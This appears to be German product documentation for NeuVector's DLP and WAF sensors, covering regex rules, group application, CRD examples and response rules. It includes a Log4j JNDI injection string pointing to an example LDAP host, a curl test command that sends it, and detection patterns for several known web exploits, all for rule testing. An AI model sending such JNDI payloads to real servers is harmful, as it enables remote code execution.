= DLP- und WAF-Sensoren
:revdate1: 2025-05-05
:page-revdate: {revdate}
:page-opendocs-origin: /05.policy/09.dlp/09.dlp.md
:page-opendocs-slug:  /policy/dlp

== Schutz vor Datenverlust (DLP) und Web Application Firewall (WAF)

DLP und WAF verwenden die Deep Packet Inspection (DPI) von {product-name}, um die Netzwerk-Payloads von Verbindungen auf Verletzungen sensibler Daten zu untersuchen. {product-name} verwendet eine auf regulären Ausdrücken (regex) basierende Engine, um Paketfilterfunktionen auszuführen. Bei der Anwendung von Sensoren auf den Containerverkehr ist äußerste Vorsicht geboten, da die Filterfunktion zusätzlichen System-Overhead verursacht und die Leistung des Hosts beeinträchtigen kann.

DLP- und WAF-Filter werden je nach Gruppe(n), auf die sie angewandt werden, unterschiedlich angewendet. Im Allgemeinen wird die WAF-Filterung auf ein- und ausgehende Verbindungen angewendet, mit Ausnahme des internen Datenverkehrs, bei dem nur die eingehende Verbindung gefiltert wird. Die DLP-Filterung gilt für ein- und ausgehende Verbindungen aus einer "Sicherheitsdomäne", aber nicht für interne Verbindungen innerhalb einer Sicherheitsdomäne. Siehe die detaillierten Beschreibungen unten.

Die Konfiguration von DLP oder WAF ist ein zweistufiger Prozess:

. Definieren und testen Sie den/die Sensor(en), d. h. die Menge der regulären Ausdrücke, die für die Übereinstimmung mit dem Header, der URL oder dem gesamten Paket verwendet werden.
. Wenden Sie den gewünschten Sensor auf eine Gruppe an, und zwar im Bildschirm Richtlinie -> Gruppen.

=== WAF-Sensoren

WAF-Sensoren dienen der Überprüfung des Netzwerkverkehrs zu/von einem Pod/Container. Diese Sensoren können auf jede anwendbare Gruppe angewendet werden, auch auf benutzerdefinierte Gruppen (z. B. Namespace-Gruppen). Eingehender Verkehr zu ALLEN Containern innerhalb der Gruppe wird auf die Erkennung von WAF-Regeln untersucht. Darüber hinaus werden alle ausgehenden (egress) Verbindungen außerhalb des Clusters überprüft.

Das bedeutet, dass diese Funktion zwar WAF genannt wird, aber für jeden Netzwerkverkehr nützlich und anwendbar ist, nicht nur für den Datenverkehr von Webanwendungen, und daher einen umfassenderen Schutz bietet als einfache WAFs. So kann beispielsweise die API-Sicherheit für ausgehende Verbindungen zu einem externen API-Dienst erzwungen werden, indem nur GET-Anfragen zugelassen und POSTs blockiert werden.

Beachten Sie auch, dass die Inspektion zwar ähnlich wie bei DLP ist, sich aber auf eingehenden Verkehr zu JEDEM Pod/Container innerhalb der Gruppe bezieht, während DLP die Inspektion nur auf eingehenden und ausgehenden Verkehr aus der Gruppe (d. h. die Sicherheitsgrenze) anwendet, nicht aber auf internen Verkehr innerhalb der Gruppe (z. B. nicht von Ost nach West innerhalb der Container einer Gruppe).

image:waf_sensors.png[waf]

=== DLP-Sensoren

DLP-Sensoren sind die Muster, die zur Überprüfung des Datenverkehrs verwendet werden. Eingebaute Sensoren wie Kreditkarte und US-Sozialversicherung haben vordefinierte reguläre Ausdrücke. Sie können benutzerdefinierte Sensoren hinzufügen, indem Sie Regex-Muster definieren, die in diesem Sensor verwendet werden sollen. Beachten Sie, dass DLP ähnlich wie WAF nur den ein- und ausgehenden Verkehr der Gruppe (d. h. die Sicherheitsgrenze) prüft, nicht aber den gruppeninternen Verkehr (z. B. nicht von Ost nach West innerhalb der Container einer Gruppe). Die WAF-Prüfung gilt nur für eingehenden Datenverkehr zu JEDEM Pod/Container innerhalb der Gruppe.

image:sensors.png[dlp]

=== Konfigurieren von DLP- und WAF-Sensoren

Die Konfiguration von DLP- und WAF-Sensoren ist ähnlich. Erstellen Sie einen Sensornamen und einen Kommentar und wählen Sie dann den Sensor aus, um die Regeln für diesen Sensor hinzuzufügen oder zu bearbeiten. Zu den Schlüsselbereichen gehören:

* Haben/Nicht Haben. Legt fest, ob das Muster gefunden werden muss (Have), damit die Aktion durchgeführt werden kann (z. B. Deny), oder ob die Aktion nur durchgeführt werden soll, wenn das Muster nicht existiert (Not Have). Es wird empfohlen, den Operator "Nicht haben" in der Regel mit einem Muster zu kombinieren, das den Operator "Haben" verwendet, da ein einzelnes Muster mit dem Operator "Nicht haben" nicht wirksam ist.
* Muster. Dies ist der reguläre Ausdruck, der zur Bestimmung einer Übereinstimmung verwendet wird. Sie können Ihre Regex mit Beispieldaten testen, um korrekte Haben/Nicht-Haben-Ergebnisse sicherzustellen.
* Context. Wo wird nach der Musterübereinstimmung gesucht. Wählen Sie "Paket" für eine umfassende Prüfung der gesamten Netzwerkverbindung oder beschränken Sie die Prüfung auf die URL, den Header oder den Body.

image:5_sensor_config.png[waf]

Jede DLP/WAF-Regel unterstützt mehrere Muster (maximal 16 Muster sind pro Regel zulässig). Mehrere Muster sowie die Festlegung des Regelkontextes können ebenfalls dazu beitragen, Fehlalarme zu reduzieren.

Beispiel für eine DLP-Regel mit einem Have/Not Have-Muster:
Haben:

[,shell]
----
\b3[47]\d{2}([ -]?)(?!(\d)\2{5}|123456|234567|345678)\d{6}\1(?!(\d)\3{4}|12345|56789)\d{5}\b
----

Dies führt zu einer falsch positiven Übereinstimmung für "istio_agent_go_gc_duration_seconds_sum 22.378386247999998":

[,shell]
----
docker exec -ti httpclient sh
/ # curl -d "{\"context\": \"istio_agent_go_gc_duration_seconds_sum 22.378386247999998\"}" 172.17.0.5:8080/
Hello, world!
----

Das Hinzufügen eines Nicht-Haben-Musters beseitigt den Fehlalarm:

[,shell]
----
istio\_(\w){5}
----

*_Die Sensoren müssen auf eine Gruppe angewendet werden, um wirksam zu werden._*

=== Konfigurieren von föderierten DLP- und WAF-Sensoren

Dies ist der allgemeine Prozess zur Konfiguration eines föderierten DLP- oder WAF-Sensors:

. Definieren und testen Sie den/die föderierten DLP/WAF-Sensor(en), d. h. den Satz regulärer Ausdrücke, der verwendet wird, um den Header, die URL oder das gesamte Paket im **primären Cluster** abzugleichen ** -> Federated Policy -> ** Registerkarte **DLP Sensors oder WAF Sensors**.
. Wenden Sie den gewünschten Sensor auf eine benutzerdefinierte Verbundgruppe auf der Registerkarte **Verbundrichtlinie -> Gruppen** an.
. Überprüfen Sie, ob die föderierten DLP/WAF-Sensoren mit dem verwalteten Cluster synchronisiert sind und wie erwartet funktionieren.

==== Beispiel

Definieren Sie einen oder mehrere Verbund-DLP/WAF-Sensoren in einem primären Cluster und wenden Sie sie dann auf eine benutzerdefinierte Verbundgruppe an, und überprüfen Sie dann, ob diese Sensoren auf alle verwalteten Cluster angewendet werden.

Schritte:

. Definieren Sie den/die föderierten DLP/WAF-Sensor(en) im primären Cluster auf der entsprechenden Registerkarte **DLP-Sensoren** oder **WAF-Sensoren**:
+
image:federated_1.png[Föderierte WAF]
+
image:federated_2.png[Föderierte DLP]

. Wenden Sie den/die Verbund-DLP/WAF-Sensor(en) auf eine benutzerdefinierte Verbundgruppe auf der Registerkarte **Gruppen der Verbundrichtlinie -> ** an:
+
image:federated_3.png[Benutzerdefinierte föderierte Gruppe]

. Überprüfen Sie, ob die föderierten DLP/WAF-Sensoren mit den verwalteten Clustern synchronisiert sind:
+
image:federated_4.png[Föderierte WAF]
+
image:federated_5.png[Föderierte DLP]

. In den verwalteten Clustern senden Container den Datenverkehr aus, der dem Muster der föderierten DLP/WAF-Sensoren entspricht:
+
image:federated_6.png[Föderierter Containerverkehr]

. Nach Schritt 4 werden DLP/WAF-Benachrichtigungen über "Sicherheitsereignisse" generiert:
+
image:federated_7.png[DLP/WAF-Sicherheitsbenachrichtigung generieren]

=== Anwendung von DLP/WAF-Sensoren auf Container-Gruppen

Um einen DLP- oder WAF-Sensor zu aktivieren, gehen Sie zu Policy -> Groups und wählen Sie die gewünschte Gruppe aus. Aktivieren Sie DLP/WAF für die Gruppe und fügen Sie den/die Sensor(en) hinzu.

Es wird empfohlen, DLP-Sensoren an der Grenze einer Sicherheitszone einzusetzen, die durch eine Gruppe definiert ist, um die Auswirkungen der DLP-Inspektion zu minimieren. Definieren Sie bei Bedarf eine benutzerdefinierte Gruppe, die eine solche Sicherheitszone darstellt.  Wenn beispielsweise als Gruppe die reservierte Gruppe "Container" ausgewählt wird und DLP-Sensoren zu der Gruppe hinzugefügt werden, wird nur der Datenverkehr in oder aus dem Cluster und nicht zwischen allen Containern inspiziert. Oder wenn es sich um eine benutzerdefinierte Gruppe handelt, die als "namespace=demo" definiert ist, dann wird nur der Verkehr in oder aus dem Namensraum "demo" untersucht, nicht aber der Verkehr zwischen Containern innerhalb des Namensraums.

Es wird empfohlen, WAF-Sensoren nur auf Gruppen anzuwenden, in denen eingehende (z. B. Ingress-) Verbindungen erwartet werden, es sei denn, der/die Sensor(en) gelten für bestimmte interne Anwendungen (die Ost-West-Verkehr erwarten).

image:apply_dlp_group.png[Gruppe]

==== Zusammenfassung des DLP/WAF-Verhaltens

* Der DLP-Musterabgleich erfolgt nicht für den Datenverkehr zwischen Workloads, die zur selben DLP-Gruppe gehören.
* Jeder Verkehr, der in eine DLP-Gruppe ein- und ausgeht, wird auf Musterübereinstimmungen geprüft.
* Der Eingangs- und Ausgangsdatenverkehr des Clusters wird auf Muster untersucht, wenn der Arbeitslast erlaubt wird, Eingangs-/Ausgangsverbindungen herzustellen.
* Mehrere Muster pro DLP/WAF-Regel (maximal 16 Muster sind pro Regel zulässig).
* Für ein einzelnes Paket werden mehrere Warnungen erzeugt, wenn es mehreren Regeln entspricht.
* Aus Leistungsgründen werden nur die ersten 16 Regeln gemeldet und abgeglichen, auch wenn das Paket mehr als 16 Regeln entspricht.
* Alarme werden zusammengefasst und gemeinsam gemeldet, wenn dieselbe Regel zutrifft und innerhalb von 2 Sekunden mehrfach Alarm schlägt.
* PCRE wird für den Mustervergleich verwendet.
* Die Hyper-Scan-Bibliothek wird für den effizienten, skalierbaren und leistungsstarken Musterabgleich verwendet.

=== DLP/WAF-Aktionen in den Modi Entdecken, Überwachen, Schützen

Beim Hinzufügen von Sensoren zu Gruppen kann die DLP/WAF-Aktion auf "Warnen" oder "Ablehnen" eingestellt werden, wobei sich bei einer Übereinstimmung folgendes Verhalten ergibt:

* Entdeckungsmodus. Unabhängig von der Einstellung "Alert/Deny" wird immer ein Alarm ausgelöst.
* Monitor-Modus. Unabhängig von der Einstellung "Alert/Deny" wird immer ein Alarm ausgelöst.
* Schutzmodus. Die Aktion ist eine Warnung, wenn sie auf "Alert" gesetzt ist, oder eine Blockierung, wenn sie auf "Deny" gesetzt ist.

=== Log4j-Erkennung WAF-Muster

Die WAF-ähnliche Regel zur Erkennung des versuchten Log4j-Exploits ist unten aufgeführt. Bitte beachten Sie, dass dies nur auf Gruppen angewendet werden sollte, die eingehende Webverbindungen erwarten.

[,shell]
----
\$\{((\$|\{|\s|lower|upper|\:|\-|\})*[jJ](\$|\{|\s|lower|upper|\:|\-|\})*[nN](\$|\{|\s|lower|upper|\:|\-|\})*[dD](\$|\{|\s|lower|upper|\:|\-|\})*[iI])((\$|\{|\s|lower|upper|\:|\-|\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\:\/\/.*
----

Beachten Sie auch, dass es Wege gibt, wie Angreifer die Erkennung durch solche Regeln umgehen können.

=== Testen der Log4j WAF-Erkennung

Bei einem Angriffsversuch konstruiert der Angreifer eine anfängliche jndi:-Einfügung und fügt sie in den User-Agent-HTTP-Header ein:

[,shell]
----
User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}
----

Die Verwendung von curl zum POST von Daten an den Server (Container) kann helfen, die WAF-Regel zu testen:

[,shell]
----
curl -X POST -k  -H "X-Auth-Token: $_TOKEN_" -H "Content-Type: application/json" -H "User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}" -d '$SOME_DATA' "http://$SOME_IP_:$PORT"
----

=== WAF-Einrichtung und -Test

Die nachstehende herunterladbare Datei enthält ein nicht unterstütztes Skript zum Erstellen von WAF-Sensoren über CRD und zum Ausführen allgemeiner WAF-Regelprüfungen gegen diese Sensoren. Die README enthält Anweisungen zur Ausführung des Programms.

xref:attachment$waf_test.zip[WAF-Testskript herunterladen]

=== Musterwarnungen

==== DLP-Abgleich im Erkennungs- oder Überwachungsmodus

image:dlp4_alert_discover.png[DLPAlert]

==== DLP-Übereinstimmung im Schutzmodus

image:dlp_5_protect.png[DLPProtect]

==== DLP-Sicherheitsereignisbenachrichtigung für Kreditkartenabgleich

image:dlp6_credit.png[DLPCredit]

[NOTE]
====
Die automatische Paketerfassung enthält das eigentliche Paket mit der übereinstimmenden Kreditkartennummer. Dies gilt auch für jede DLP-Paketaufnahme für sensible Daten.
====

== Verwaltung von WAF-Regeln durch Import/Export oder CRDs

Es ist möglich, WAF-Regeln vom WAF-Bildschirm aus zu importieren oder zu exportieren. Dies kann nützlich sein, um Regeln auf andere Cluster zu übertragen, ein Backup zu erstellen oder sie für die Anwendung als CRD vorzubereiten.

Um WAF-Sensoren zu erstellen oder einen WAF-Sensor mithilfe von CRDs auf eine Gruppe anzuwenden, müssen Sie sicherstellen, dass die entsprechende NVWafSecurityRule-Clusterrollenbindung erstellt wurde.

Beispiel WAF-Sensor CRD

.Klicken Sie hier für Details
[%collapsible]
====
[,yaml]
----
apiVersion: v1
items:
- apiVersion: neuvector.com/v1
  kind: NvWafSecurityRule
  metadata:
    name: sensor.execution
  spec:
    sensor:
      comment: arbitrary command execution attempt
      name: sensor.execution
      rules:
      - name: Alchemy
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/NUL\/.*\.\.\/\.\.\/
      - name: Log4j
        patterns:
        - context: header
          key: pattern
          op: regex
          value: \$\{((\$|\{|\s|lower|upper|\:|\-|\})*[jJ](\$|\{|\s|lower|upper|\:|\-|\})*[nN](\$|\{|\s|lower|upper|\:|\-|\})*[dD](\$|\{|\s|lower|upper|\:|\-|\})*[iI])((\$|\{|\s|lower|upper|\:|\-|\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\:\/\/.*
      - name: formmail
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/formmail
        - context: packet
          key: pattern
          op: regex
          value: \x0a
      - name: CCBill
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/whereami\.cgi?.*g=
      - name: DotNetNuke
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/Install\/InstallWizard.aspx.*executeinstall
      - name: HNAP
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/tmUnblock.cgi
        - context: header
          key: pattern
          op: regex
          value: 'Authorization: Basic\s*YWRtaW46'
      - name: Magento
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/Adminhtml_.*forwarded=
      - name: b2
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/b2\/b2-include\/.*b2inc.*http\x3a\/\/
      - name: bat
        patterns:
        - context: url
          key: pattern
          op: regex
          value: x2ebat\x22.*?\x26
      - name: eshop.pl
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/eshop\.pl?.*seite=\x3b
      - name: whois_raw.cgi
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/whois_raw\.cgi?
        - context: packet
          key: pattern
          op: regex
          value: \x0a
kind: List
metadata: null
----
====

CRD-Beispiel für die Anwendung eines WAF-Sensors auf eine Gruppe

.Klicken Sie hier für Details
[%collapsible]
====
[,yaml]
----
apiVersion: v1
items:
- apiVersion: neuvector.com/v1
  kind: NvSecurityRule
  metadata:
    name: demo-group
    namespace: demo
  spec:
    egress: []
    file: []
    ingress: []
    process: []
    process_profile:
      baseline: default
    target:
      policymode: N/A
      selector:
        comment: ""
        criteria:
        - key: domain
          op: =
          value: demo
        - key: service
          op: =
          value: nginx-pod.demo
        - key: service
          op: =
          value: node-pod.demo
        name: demo-group
        original_name: ""
    waf:
      settings:
      - action: deny
        name: sensor.cross
      - action: deny
        name: sensor.execution
      - action: deny
        name: sensor.injection
      - action: deny
        name: sensor.traversal
      - action: deny
        name: wafsensor-1
      status: true
kind: List
metadata: null
----
====

Weitere Einzelheiten zur Arbeit mit xref:usingcrd.adoc[CRDs] finden Sie im xref:usingcrd.adoc[Abschnitt CRDs].

== DLP/WAF-Reaktionsregeln

Reaktionsregeln, die auf DLP/WAF-Sicherheitsereignissen basieren, können unter Policy ->Response Rules erstellt werden. Beginnen Sie mit dem Typ DLP oder WAF, und das Dropdown-Menü listet alle Sensoren und Muster auf, die zur Erstellung von Regeln zur Verfügung stehen.

image:dlp7_response.png[DLPResponse]
